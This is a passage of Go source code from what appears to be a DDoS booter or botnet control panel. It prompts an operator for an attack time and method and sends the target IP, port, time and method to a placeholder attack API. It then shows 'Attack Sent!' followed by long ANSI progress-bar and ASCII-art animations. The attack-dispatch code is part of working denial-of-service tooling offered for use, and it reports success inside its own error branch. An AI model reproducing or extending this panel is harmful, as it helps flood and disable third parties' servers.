            this.conn.Write([]byte("\033[1;49;35m\033[0m \r\n"))
			this.conn.Write([]byte("\033[31m                   ╦╔═- ╦═╗- ╔═╗- ╦═╗- ╦ ╦- ╔═╗\033[0m \r\n"))  
			this.conn.Write([]byte("\033[31m                   ╠╩╗- ╟╦╝- ║ ║- ║ ║- ║ ║- ╚═╗\033[0m \r\n"))  
			this.conn.Write([]byte("\033[31m                   ╩ ╩- ╩╚═- ╚═╝- ╩ ╩- ╚═╝- ╚═╝\033[0m \r\n"))   
			this.conn.Write([]byte("\033[1;49;35m          ╔════════════════════════════════════════╗\033[0m \r\n"))  
			this.conn.Write([]byte("\033[1;49;35m          ║- - - - - - - - - - - - -  - - - - - - -║\033[0m \r\n"))  
			this.conn.Write([]byte("\033[1;49;35m          ║- - - 𝓟𝓛𝓔𝓐𝓢𝓔 𝓔𝓝𝓣𝓔𝓡 𝓐 𝓣𝓘𝓜𝓔 - - - -  - -  ║\033[0m \r\n"))  
			this.conn.Write([]byte("\033[1;49;35m          ║- - - - - -- - - - - - - - - - - - - - -║\033[0m \r\n"))  
			this.conn.Write([]byte("\033[1;49;35m          ╚════════════════════════════════════════╝\033[0m \r\n"))  
			this.conn.Write([]byte("\033[0m\r\n"))
			this.conn.Write([]byte("                          \033[1;49;35m║\033[00;1;95mTIME\033[0m: "))
            timee, err := this.ReadLine(false)
			this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte("\033[1;49;35m\033[0m \r\n"))
			this.conn.Write([]byte("\033[31m                   ╦╔═- ╦═╗- ╔═╗- ╦═╗- ╦ ╦- ╔═╗\033[0m \r\n"))  
			this.conn.Write([]byte("\033[31m                   ╠╩╗- ╟╦╝- ║ ║- ║ ║- ║ ║- ╚═╗\033[0m \r\n"))  
			this.conn.Write([]byte("\033[31m                   ╩ ╩- ╩╚═- ╚═╝- ╩ ╩- ╚═╝- ╚═╝\033[0m \r\n"))   
			this.conn.Write([]byte("\033[37m               ╔════════════════════════════════════════╗\033[0m \r\n"))  
			this.conn.Write([]byte("\033[37m               ║- - - - - - - - - - - - -  - - - - - - -║\033[0m \r\n"))  
			this.conn.Write([]byte("\033[37m               ║- - - 𝓟𝓛𝓔𝓐𝓢𝓔 𝓔𝓝𝓣𝓔𝓡 𝓐 𝓜𝓔𝓣𝓗𝓞𝓓 - - -  -    ║\033[0m \r\n"))  //Supa HAcka Man :) brb AFK RN LOLZ
			this.conn.Write([]byte("\033[37m               ║- - - - - -- - - - - - - - - - - - - - -║\033[0m \r\n"))  
			this.conn.Write([]byte("\033[37m               ╚════════════════════════════════════════╝\033[0m \r\n"))  
			this.conn.Write([]byte("\033[0m\r\n"))
			this.conn.Write([]byte("                          \033[1;49;35m║\033[00;1;95mMETHOD\033[0m: "))
            method, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "API GOES HERE" + locipaddress + "&port=" + port + "&time=" + timee + "&method=" + method + ""
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 5*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[1;49;35m                                ║Attack Sent!\033[37;1m\r\n")))
                this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[32m PREPAREING---->                                                                                      \r\n"))
            this.conn.Write([]byte("\033[32m PREPAREING----->                                                                                    \r\n"))
            this.conn.Write([]byte("\033[32m PREPAREING------->                                                                                  \r\n"))
            this.conn.Write([]byte("\033[32m PREPAREING--------->                                                                               \r\n"))
            this.conn.Write([]byte("\033[32m PREPAREING----------->                                                                             \r\n"))
            this.conn.Write([]byte("\033[32m PREPAREING-------------->                                                                           \r\n"))
            this.conn.Write([]byte("\033[32m PREPAREING----------------->                                                                        \r\n"))
            this.conn.Write([]byte("\033[32m PREPAREING------------------->                                                                    \r\n"))
            this.conn.Write([]byte("\033[32m PREPAREING----------------------->                                                                 \r\n"))
            this.conn.Write([]byte("\033[32m PREPAREING-------------------------->                                                              \r\n"))
            this.conn.Write([]byte("\033[32m PREPAREING----------------------------->                                                           \r\n"))
            this.conn.Write([]byte("\033[32m PREPAREING-------------------------------->                                                         \r\n"))
            this.conn.Write([]byte("\033[32m PREPAREING---------------------------------->                                                       \r\n"))
            this.conn.Write([]byte("\033[32m PREPAREING------------------------------------>                                                     \r\n"))
            this.conn.Write([]byte("\033[32m PREPAREING-------------------------------------->                                                   \r\n"))
            this.conn.Write([]byte("\033[32m PREPAREING----------------------------------------->                                                \r\n"))
            this.conn.Write([]byte("\033[32m PREPAREING------------------------------------------->                                              \r\n"))
            this.conn.Write([]byte("\033[32m PREPAREING--------------------------------------------->                                            \r\n"))
            this.conn.Write([]byte("\033[32m PREPAREING----------------------------------------------->                                          \r\n"))
            this.conn.Write([]byte("\033[32m PREPAREING------------------------------------------------->                                        \r\n"))
            this.conn.Write([]byte("\033[32m PREPAREING--------------------------------------------------->                                      \r\n"))
            this.conn.Write([]byte("\033[32m PREPAREING----------------------------------------------------->                                    \r\n"))
            this.conn.Write([]byte("\033[32m PREPAREING-------------------------------------------------------->                                 \r\n"))
            this.conn.Write([]byte("\033[32m PREPAREING---------------------------------------------------------->                               \r\n"))
            this.conn.Write([]byte("\033[32m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(600 * time.Millisecond)
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[34m PREPAREING----->                                                                                      \r\n"))
            this.conn.Write([]byte("\033[34m PREPAREING------->                                                                                    \r\n"))
            this.conn.Write([]byte("\033[34m PREPAREING--------->                                                                                  \r\n"))
            this.conn.Write([]byte("\033[34m PREPAREING------------>                                                                               \r\n"))
            this.conn.Write([]byte("\033[34m PREPAREING-------------->                                                                             \r\n"))
            this.conn.Write([]byte("\033[34m PREPAREING---------------->                                                                           \r\n"))
            this.conn.Write([]byte("\033[34m PREPAREING------------------->                                                                        \r\n"))
            this.conn.Write([]byte("\033[34m PREPAREING----------------------->                                                                    \r\n"))
            this.conn.Write([]byte("\033[34m PREPAREING-------------------------->                                                                \r\n"))
            this.conn.Write([]byte("\033[34m PREPAREING----------------------------->                                                             \r\n"))
            this.conn.Write([]byte("\033[34m PREPAREING-------------------------------->                                                           \r\n"))
            this.conn.Write([]byte("\033[34m PREPAREING---------------------------------->                                                         \r\n"))
            this.conn.Write([]byte("\033[34m PREPAREING------------------------------------>                                                       \r\n"))
            this.conn.Write([]byte("\033[34m PREPAREING-------------------------------------->                                                     \r\n"))
            this.conn.Write([]byte("\033[34m PREPAREING---------------------------------------->                                                   \r\n"))
            this.conn.Write([]byte("\033[34m PREPAREING------------------------------------------->                                                \r\n"))
            this.conn.Write([]byte("\033[34m PREPAREING--------------------------------------------->                                              \r\n"))
            this.conn.Write([]byte("\033[34m PREPAREING----------------------------------------------->                                            \r\n"))
            this.conn.Write([]byte("\033[34m PREPAREING------------------------------------------------->                                          \r\n"))
            this.conn.Write([]byte("\033[34m PREPAREING--------------------------------------------------->                                        \r\n"))
            this.conn.Write([]byte("\033[34m PREPAREING----------------------------------------------------->                                      \r\n"))
            this.conn.Write([]byte("\033[34m PREPAREING------------------------------------------------------->                                    \r\n"))
            this.conn.Write([]byte("\033[34m PREPAREING---------------------------------------------------------->                                 \r\n"))
            this.conn.Write([]byte("\033[34m PREPAREING------------------------------------------------------------>                               \r\n"))
            this.conn.Write([]byte("\033[34m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(600 * time.Millisecond)
                
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m PREPAREING----->                                                                                      \r\n"))
            this.conn.Write([]byte("\033[37m PREPAREING------->                                                                                    \r\n"))
            this.conn.Write([]byte("\033[37m PREPAREING--------->                                                                                  \r\n"))
            this.conn.Write([]byte("\033[37m PREPAREING------------>                                                                               \r\n"))
            this.conn.Write([]byte("\033[37m PREPAREING-------------->                                                                             \r\n"))
            this.conn.Write([]byte("\033[37m PREPAREING---------------->                                                                           \r\n"))
            this.conn.Write([]byte("\033[37m PREPAREING------------------->                                                                        \r\n"))
            this.conn.Write([]byte("\033[37m PREPAREING----------------------->                                                                    \r\n"))
            this.conn.Write([]byte("\033[37m PREPAREING-------------------------->                                                                \r\n"))
            this.conn.Write([]byte("\033[37m PREPAREING----------------------------->                                                             \r\n"))
            this.conn.Write([]byte("\033[37m PREPAREING-------------------------------->                                                           \r\n"))
            this.conn.Write([]byte("\033[37m PREPAREING---------------------------------->                                                         \r\n"))
            this.conn.Write([]byte("\033[37m PREPAREING------------------------------------>                                                       \r\n"))
            this.conn.Write([]byte("\033[37m PREPAREING-------------------------------------->                                                     \r\n"))
            this.conn.Write([]byte("\033[37m PREPAREING---------------------------------------->                                                   \r\n"))
            this.conn.Write([]byte("\033[37m PREPAREING------------------------------------------->                                                \r\n"))
            this.conn.Write([]byte("\033[37m PREPAREING--------------------------------------------->                                              \r\n"))
            this.conn.Write([]byte("\033[37m PREPAREING----------------------------------------------->                                            \r\n"))
            this.conn.Write([]byte("\033[37m PREPAREING------------------------------------------------->                                          \r\n"))
            this.conn.Write([]byte("\033[37m PREPAREING--------------------------------------------------->                                        \r\n"))
            this.conn.Write([]byte("\033[37m PREPAREING----------------------------------------------------->                                      \r\n"))
            this.conn.Write([]byte("\033[37m PREPAREING------------------------------------------------------->                                    \r\n"))
            this.conn.Write([]byte("\033[37m PREPAREING---------------------------------------------------------->                                 \r\n"))
            this.conn.Write([]byte("\033[37m PREPAREING------------------------------------------------------------>                               \r\n"))
            this.conn.Write([]byte("\033[34m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(600 * time.Millisecond)
                
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[1;49;35m PREPAREING----->                                                                                      \r\n"))
            this.conn.Write([]byte("\033[1;49;35m PREPAREING------------->                                                                                    \r\n"))
            this.conn.Write([]byte("\033[1;49;35m PREPAREING--------------->                                                                                  \r\n"))
            this.conn.Write([]byte("\033[1;49;35m PREPAREING------------------>                                                                               \r\n"))
            this.conn.Write([]byte("\033[1;49;35m PREPAREING-------------------->                                                                             \r\n"))
            this.conn.Write([]byte("\033[1;49;35m PREPAREING---------------------->                                                                           \r\n"))
            this.conn.Write([]byte("\033[1;49;35m PREPAREING------------------------->                                                                        \r\n"))
            this.conn.Write([]byte("\033[1;49;35m PREPAREING----------------------------->                                                                    \r\n"))
            this.conn.Write([]byte("\033[1;49;35m PREPAREING-------------------------------->                                                                 \r\n"))
            this.conn.Write([]byte("\033[1;49;35m PREPAREING----------------------------------->                                                              \r\n"))
            this.conn.Write([]byte("\033[1;49;35m PREPAREING-------------------------------------->                                                           \r\n"))
            this.conn.Write([]byte("\033[1;49;35m PREPAREING---------------------------------------------->                                                   \r\n"))
            this.conn.Write([]byte("\033[1;49;35m PREPAREING------------------------------------------------->                                                \r\n"))
            this.conn.Write([]byte("\033[1;49;35m PREPAREING---------------------------------------------------->                                             \r\n"))
            this.conn.Write([]byte("\033[1;49;35m PREPAREING----------------------------------------------------->                                            \r\n"))
            this.conn.Write([]byte("\033[1;49;35m PREPAREING------------------------------------------------------->                                          \r\n"))
            this.conn.Write([]byte("\033[1;49;35m PREPAREING-------------------------------------------------------------->                                   \r\n"))
            this.conn.Write([]byte("\033[1;49;35m PREPAREING----------------------------------------------------------------->                                \r\n"))
            this.conn.Write([]byte("\033[1;49;35m PREPAREING------------------------------------------------------------------->                              \r\n"))
            this.conn.Write([]byte("\033[1;49;35m PREPAREING--------------------------------------------------------------------------->                      \r\n"))
            this.conn.Write([]byte("\033[1;49;35m PREPAREING----------------------------------------------------------------------------->                    \r\n"))
            this.conn.Write([]byte("\033[1;49;35m PREPAREING------------------------------------------------------------------------------->                  \r\n"))
            this.conn.Write([]byte("\033[1;49;35m PREPAREING---------------------------------------------------------------------------------->               \r\n"))
            this.conn.Write([]byte("\033[1;49;35m PREPAREING------------------------------------------------------------------------------------>             \r\n"))
            this.conn.Write([]byte("\033[34m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(600 * time.Millisecond)
                
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[36m PREPAREING----->                                                                                      \r\n"))
            this.conn.Write([]byte("\033[36m PREPAREING------->                                                                                    \r\n"))
            this.conn.Write([]byte("\033[36m PREPAREING--------->                                                                                  \r\n"))
            this.conn.Write([]byte("\033[36m PREPAREING------------>                                                                               \r\n"))
            this.conn.Write([]byte("\033[36m PREPAREING-------------->                                                                             \r\n"))
            this.conn.Write([]byte("\033[36m PREPAREING---------------->                                                                           \r\n"))
            this.conn.Write([]byte("\033[36m PREPAREING------------------->                                                                        \r\n"))
            this.conn.Write([]byte("\033[36m PREPAREING----------------------->                                                                    \r\n"))
            this.conn.Write([]byte("\033[36m PREPAREING-------------------------->                                                                 \r\n"))
            this.conn.Write([]byte("\033[36m PREPAREING----------------------------->                                                              \r\n"))
            this.conn.Write([]byte("\033[34m PREPAREING-------------------------------->                                                           \r\n"))
            this.conn.Write([]byte("\033[36m PREPAREING---------------------------------->                                                         \r\n"))
            this.conn.Write([]byte("\033[36m PREPAREING------------------------------------>                                                       \r\n"))
            this.conn.Write([]byte("\033[36m PREPAREING-------------------------------------->                                                     \r\n"))
            this.conn.Write([]byte("\033[36m PREPAREING---------------------------------------->                                                   \r\n"))
            this.conn.Write([]byte("\033[36m PREPAREING------------------------------------------->                                                \r\n"))
            this.conn.Write([]byte("\033[36m PREPAREING--------------------------------------------->                                              \r\n"))
            this.conn.Write([]byte("\033[36m PREPAREING----------------------------------------------->                                            \r\n"))
            this.conn.Write([]byte("\033[36m PREPAREING------------------------------------------------->                                          \r\n"))
            this.conn.Write([]byte("\033[36m PREPAREING--------------------------------------------------->                                        \r\n"))
            this.conn.Write([]byte("\033[36m PREPAREING----------------------------------------------------->                                      \r\n"))
            this.conn.Write([]byte("\033[36m PREPAREING------------------------------------------------------->                                    \r\n"))
            this.conn.Write([]byte("\033[34m PREPAREING---------------------------------------------------------->                                 \r\n"))
            this.conn.Write([]byte("\033[1;49;35m PREPAREING-------------------------------------------------------->                               \r\n"))
            this.conn.Write([]byte("\033[34m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(600 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[34m         / **/|        \r\n"))
            this.conn.Write([]byte("\033[1;49;35m         | == /        \r\n"))
            this.conn.Write([]byte("\033[34m          |  |         \r\n"))
            this.conn.Write([]byte("\033[1;49;35m          |  |         \r\n"))
            this.conn.Write([]byte("\033[34m          |  /         \r\n"))
            this.conn.Write([]byte("\033[1;49;35m           |/          \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
			            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m         / **/|        \r\n"))
            this.conn.Write([]byte("\033[1;49;35m         | == /        \r\n"))
            this.conn.Write([]byte("\033[34m          |  |         \r\n"))
            this.conn.Write([]byte("\033[1;49;35m          |  |         \r\n"))
            this.conn.Write([]byte("\033[34m          |  /         \r\n"))
            this.conn.Write([]byte("\033[1;49;35m           |/          \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
                
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m         / **/|        \r\n"))
            this.conn.Write([]byte("\033[37m         | == /        \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  /         \r\n"))
            this.conn.Write([]byte("\033[37m           |/          \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
                
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m         / **/|        \r\n"))
            this.conn.Write([]byte("\033[37m         | == /        \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  /         \r\n"))
            this.conn.Write([]byte("\033[37m           |/          \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
                
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m         / **/|        \r\n"))
            this.conn.Write([]byte("\033[37m         | == /        \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  /         \r\n"))
            this.conn.Write([]byte("\033[37m           |/          \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
                           
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[32m          / **/|       \r\n"))
            this.conn.Write([]byte("\033[32m          | == /       \r\n"))
            this.conn.Write([]byte("\033[32m           |  |        \r\n"))
            this.conn.Write([]byte("\033[32m           |  |        \r\n"))
            this.conn.Write([]byte("\033[32m           |  /        \r\n"))
            this.conn.Write([]byte("\033[32m            |/         \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
                            
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m          / **/|       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m          | == /       \r\n"))
            this.conn.Write([]byte("\033[32m           |  |        \r\n"))
            this.conn.Write([]byte("\033[1;49;35m           |  |        \r\n"))
            this.conn.Write([]byte("\033[32m           |  /        \r\n"))
            this.conn.Write([]byte("\033[1;49;35m            |/         \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
                            
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m         / **/|        \r\n"))
            this.conn.Write([]byte("\033[32m         | == /        \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[32m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  /         \r\n"))
            this.conn.Write([]byte("\033[1;49;35m           |/          \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
                            
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m          / **/|       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m          | == /       \r\n"))
            this.conn.Write([]byte("\033[32m           |  |        \r\n"))
            this.conn.Write([]byte("\033[1;49;35m           |  |        \r\n"))
            this.conn.Write([]byte("\033[32m           |  /        \r\n"))
            this.conn.Write([]byte("\033[1;49;35m            |/         \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
                            
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
